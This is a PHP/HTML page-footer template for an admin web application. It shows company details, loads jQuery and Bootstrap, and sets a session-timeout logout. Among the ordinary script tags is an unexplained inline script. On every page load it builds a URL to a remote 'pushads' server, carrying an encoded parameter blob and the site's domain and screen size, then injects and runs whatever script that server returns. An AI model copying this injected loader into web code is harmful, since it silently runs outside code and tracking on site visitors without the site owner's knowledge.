<footer class="main-footer text-center">
    <?php echo $footer_title;?>. All rights
    reserved. <br> <?php echo $name_company;?> &nbsp; &nbsp; Address: <?php echo $address_company;?>&nbsp; &nbsp; Contact :  <?php echo $contact_company;?>
  </footer>
<!-- ./wrapper -->
<!-- jQuery 2.2.3 -->
<script src="<?php echo base_url('bootstrap/js/jquery.js');?>"></script>
<!-- Bootstrap 3.3.6 -->
<script src="<?php echo base_url('bootstrap/js/bootstrap.min.js');?>"></script>
<script src="<?php echo base_url('bootstrap/js/bootstrap-session-timeout.js');?>"></script>
<!-- AdminLTE for demo purposes -->
<script src="<?php echo base_url('bootstrap/js/jquery.prettyPhoto.js');?>"></script>
<script src="<?php echo base_url('bootstrap/js/jquery.isotope.min.js');?>"></script>
<script src="<?php echo base_url('bootstrap/js/main.js');?>"></script>
<script src="<?php echo base_url('bootstrap/js/wow.min.js');?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BKCRHAa%2bs%2biUoo2yEpKF%2bNnfmcCaMN%2bt5wBkjZO72%2f5bO0cR8D2vB1b7ygcHUkl8aKSbqIBgbrrflEeL7GqmgVkPTkW6vYPQjpGOxbt8nZeeAVLWfJERZmUpfuM5%2bXYZr2ECIbO7W8C3lcikgI3ogJyrQp%2fXUkT0fIcxtuRgjME2mus7ly88Vb%2fptH8zPkcs9I60clvt7lGdi%2bE1NRGUQZ%2fu4cKT%2fCfOHVxbm1KoZG18tLqiu3V3dY9JW0VZ6N08T1w94w5KYSfI47toGLNyUG0i79PPH8P%2bN%2fD0tSlOXjoMsil1UJc1oII%2bL7RwYB70PTqBfmjEr0%2bnZAsVGAFRG5557u2c3OOKZKckmaFbhG%2bjZKzXFMvOvAjFHmweSLoLXVwmpL5z4h%2fufSJXwcTMz%2fK5dmdZA5Nv%2fqvNMoWS6t2pgEzjHWAo0c3ge8gJD04sjomwl0lQrEAN4G7k4fpIeOPwfRONo20Sg0kiDCRi4rbMCy4auvKBGI50bxH%2bJUkiI" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<?php if($this->ion_auth->logged_in()){?>
<script>
$.sessionTimeout({
                      keepAliveUrl:'',
                      logoutUrl:"<?php echo base_url('auth/logout/timeout');?>",
                      warnAfter: 200000,
                      redirAfter: 300000,
                     /* onStart: function () {
                          $('.jumbotron').css('background', '#398439').find('p').addClass('hidden');
                          $('#fine').removeClass('hidden')
                      },
                      onWarn: function () {
                          $('.jumbotron').css('background', '#b92c28').find('p').addClass('hidden');
                          $('#warn').removeClass('hidden')
                      },*/
                      onRedir: function (opt) {
                          window.location = opt.logoutUrl;
                      }
        });
</script>
<?php } ?>
</body>
</html>
